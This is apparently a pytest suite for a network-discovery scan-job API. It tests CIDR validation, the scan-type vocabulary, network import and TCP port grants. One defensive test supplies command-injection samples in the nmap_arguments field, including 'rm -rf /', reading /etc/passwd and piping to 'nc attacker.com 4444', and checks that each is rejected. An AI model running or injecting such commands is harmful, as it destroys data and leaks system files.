"""Tests for the discovery scan-job API's basic shape: creating and listing
scan jobs, importing scan results as a network, the scan-type vocabulary, and
the port spec a discovery request can express.

Split out of the former tests/test_discovery.py.
"""

import pytest

from tests.discovery.helpers import (
    JOBS_URL,
    PROFILES_URL,
    SCAN_URL,
    _make_profile,
    _make_scan_job_with_results,
)

# ---------------------------------------------------------------------------
# Create scan job
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_create_scan_valid_cidr(client, auth_headers, nmap_enabled):
    """Valid CIDR → 200/201/202 with a status field in the response."""
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["nmap"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code in {200, 201, 202}
    # Response may be a single job or a list — normalise for assertion
    body = resp.json()
    if isinstance(body, list):
        assert len(body) >= 1
        assert "status" in body[0]
    else:
        assert "status" in body


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_cidr",
    [
        "not-a-cidr",
        "192.168.1.300/24",
        "",
    ],
)
async def test_create_scan_invalid_cidr_returns_422(client, auth_headers, bad_cidr, nmap_enabled):
    """Malformed CIDR values should be rejected with 422."""
    payload = {"cidr": bad_cidr, "scan_types": ["nmap"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_args",
    [
        "-sV; rm -rf /",
        "-sV && cat /etc/passwd",
        "-sV | nc attacker.com 4444",
        "-sV `id`",
        "-sV $(whoami)",
    ],
)
async def test_nmap_shell_metacharacter_rejected(client, auth_headers, bad_args, nmap_enabled):
    """nmap_arguments containing shell metacharacters should be rejected with 422."""
    payload = {
        "cidr": "10.0.0.0/24",
        "scan_types": ["nmap"],
        "nmap_arguments": bad_args,
    }
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_valid_nmap_arguments_accepted(client, auth_headers, nmap_enabled):
    """Safe nmap arguments like '-sV -T4' should be accepted."""
    payload = {
        "cidr": "10.0.0.0/24",
        "scan_types": ["nmap"],
        "nmap_arguments": "-sV -T4",
    }
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code in {200, 201, 202}


# ---------------------------------------------------------------------------
# List scan jobs
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_list_scan_jobs(client, auth_headers):
    """GET /discovery/jobs → 200 and returns a list."""
    resp = await client.get(JOBS_URL, headers=auth_headers)
    assert resp.status_code == 200
    assert isinstance(resp.json(), list)


# ---------------------------------------------------------------------------
# import-as-network
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_import_as_network_without_map_id_succeeds(client, auth_headers, db_session):
    """POST import-as-network with no map_id must return 200 with edges_created key."""
    job_id, result_ids = _make_scan_job_with_results(db_session)
    payload = {
        "items": [{"scan_result_id": rid, "overrides": {}} for rid in result_ids],
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job_id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 200, f"Expected 200, got {resp.status_code}: {resp.text}"
    assert "edges_created" in resp.json()


@pytest.mark.asyncio
async def test_import_as_network_with_invalid_map_id_returns_404(client, auth_headers, db_session):
    """POST import-as-network with a non-existent map_id must return 404."""
    job_id, result_ids = _make_scan_job_with_results(db_session)
    payload = {
        "items": [{"scan_result_id": rid, "overrides": {}} for rid in result_ids],
        "map_id": 99999,
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job_id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 404, f"Expected 404, got {resp.status_code}: {resp.text}"


@pytest.mark.asyncio
async def test_import_as_network_router_override_is_tree_root(client, auth_headers, db_session):
    """A node with role='router' override must be the source of all inferred edges."""
    import datetime

    from app.db.models import Hardware, HardwareConnection, ScanJob, ScanResult

    def _iso():
        return datetime.datetime.now(datetime.UTC).isoformat()

    job = ScanJob(
        target_cidr="172.16.0.0/24",
        scan_types_json='["arp"]',
        status="completed",
        created_at=_iso(),
    )
    db_session.add(job)
    db_session.flush()

    # Router at non-.1 IP (so IPAM alone wouldn't pick it)
    router_sr = ScanResult(
        scan_job_id=job.id,
        ip_address="172.16.0.50",
        state="new",
        merge_status="pending",
        created_at=_iso(),
    )
    endpoint_srs = [
        ScanResult(
            scan_job_id=job.id,
            ip_address=f"172.16.0.{i + 100}",
            state="new",
            merge_status="pending",
            created_at=_iso(),
        )
        for i in range(3)
    ]
    db_session.add(router_sr)
    for sr in endpoint_srs:
        db_session.add(sr)
    db_session.commit()

    payload = {
        "items": (
            [{"scan_result_id": router_sr.id, "overrides": {"role": "router"}}]
            + [{"scan_result_id": sr.id, "overrides": {}} for sr in endpoint_srs]
        )
    }
    resp = await client.post(
        f"/api/v1/discovery/jobs/{job.id}/import-as-network",
        json=payload,
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    data = resp.json()
    assert data["edges_created"] == 3

    db_session.expire_all()
    router_hw = db_session.query(Hardware).filter_by(ip_address="172.16.0.50").one()
    assert router_hw.role == "router"

    connections = db_session.query(HardwareConnection).filter_by(source="discovery_inferred").all()
    assert all(c.source_hardware_id == router_hw.id for c in connections), (
        f"Expected all edges from router; got sources={[c.source_hardware_id for c in connections]}"
    )


# ---------------------------------------------------------------------------
# Scan-type vocabulary (Slice 4, D-6)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_profile_with_server_scan_type_and_agent_is_422(client, auth_headers):
    """A server-only scan type may not be dispatched to an agent (plan §3)."""
    payload = {
        "name": "agent-profile",
        "cidr": "10.88.0.0/24",
        "scan_types": ["nmap"],
        "scan_agent_id": 7,
    }
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert "nmap" in resp.text


@pytest.mark.asyncio
async def test_profile_with_agent_scan_type_and_no_agent_is_422(client, auth_headers):
    """`agent_connect` has no executor when no agent is selected."""
    payload = {
        "name": "server-profile",
        "cidr": "10.88.0.0/24",
        "scan_types": ["agent_connect"],
    }
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert "agent_connect" in resp.text


@pytest.mark.asyncio
async def test_profile_with_unknown_scan_type_is_422(client, auth_headers):
    payload = {
        "name": "bogus-profile",
        "cidr": "10.88.0.0/24",
        "scan_types": ["bogus"],
    }
    resp = await client.post(PROFILES_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text
    assert "bogus" in resp.text


@pytest.mark.asyncio
async def test_profile_update_with_unknown_scan_type_is_422(client, auth_headers, db_session):
    profile_id = _make_profile(db_session, scan_types_json='["nmap"]')
    resp = await client.patch(
        f"{PROFILES_URL}/{profile_id}",
        json={"scan_types": ["bogus"]},
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text


@pytest.mark.asyncio
async def test_profile_update_with_agent_scan_type_and_no_agent_is_422(
    client, auth_headers, db_session
):
    profile_id = _make_profile(db_session, scan_types_json='["nmap"]')
    resp = await client.patch(
        f"{PROFILES_URL}/{profile_id}",
        json={"scan_types": ["agent_connect"]},
        headers=auth_headers,
    )
    assert resp.status_code == 422, resp.text


@pytest.mark.asyncio
async def test_profile_update_without_scan_types_is_unaffected(client, auth_headers, db_session):
    """A PATCH that does not mention scan_types must not be validated against them."""
    profile_id = _make_profile(db_session, scan_types_json='["legacy_thing"]')
    resp = await client.patch(
        f"{PROFILES_URL}/{profile_id}",
        json={"name": "renamed"},
        headers=auth_headers,
    )
    assert resp.status_code == 200, resp.text
    assert resp.json()["name"] == "renamed"


@pytest.mark.asyncio
async def test_existing_profile_with_unknown_scan_type_still_loads(
    client, auth_headers, db_session
):
    """Validation is write-only: rows predating the vocabulary must keep loading."""
    profile_id = _make_profile(db_session, scan_types_json='["legacy_thing", "nmap"]')
    resp = await client.get(PROFILES_URL, headers=auth_headers)
    assert resp.status_code == 200, resp.text
    loaded = [p for p in resp.json() if p["id"] == profile_id]
    assert loaded, resp.text
    assert loaded[0]["scan_types"] == ["legacy_thing", "nmap"]


@pytest.mark.asyncio
async def test_adhoc_scan_with_unknown_scan_type_is_422(client, auth_headers, nmap_enabled):
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["bogus"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text


@pytest.mark.asyncio
async def test_adhoc_scan_with_agent_scan_type_and_no_agent_is_422(
    client, auth_headers, nmap_enabled
):
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["agent_connect"]}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text


@pytest.mark.asyncio
async def test_adhoc_scan_with_server_scan_type_and_agent_is_422(
    client, auth_headers, nmap_enabled
):
    payload = {"cidr": "192.168.1.0/24", "scan_types": ["nmap"], "scan_agent_id": 7}
    resp = await client.post(SCAN_URL, json=payload, headers=auth_headers)
    assert resp.status_code == 422, resp.text


# ---------------------------------------------------------------------------
# The port spec a discovery request can express
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("arguments", "expected"),
    [
        (None, None),
        ("", None),
        ("-sT --open", None),  # names no ports at all
        ("-p 22,443", None),
        ("-p 22,9999", 9999),
        ("-p9999", 9999),  # nmap accepts the spec glued to the flag
        ("-sT -p 443 --open", None),
        ("-p 20-24", 20),  # a range is walked, and 20 is the first ungranted one
        ("-p 22-24", 23),
        ("-p 1-65535", 1),  # the whole space, answered without expanding it
    ],
)
def test_first_ungranted_tcp_port(arguments, expected):
    """The `-p` spec is the only port set a discovery request can name today, and
    the grant is what decides whether the agent may open any of it."""
    from app.services.discovery_admission import first_ungranted_tcp_port

    granted = (22, 53, 80, 443, 445, 3389, 8000, 8080, 8443)
    assert first_ungranted_tcp_port(arguments, granted) == expected


def test_an_empty_grant_allows_no_port():
    """The Go validator's rule verbatim: a port outside the grant is a capability
    violation, not a missing default, so an empty list grants nothing."""
    from app.services.discovery_admission import first_ungranted_tcp_port

    assert first_ungranted_tcp_port("-p 22", ()) == 22
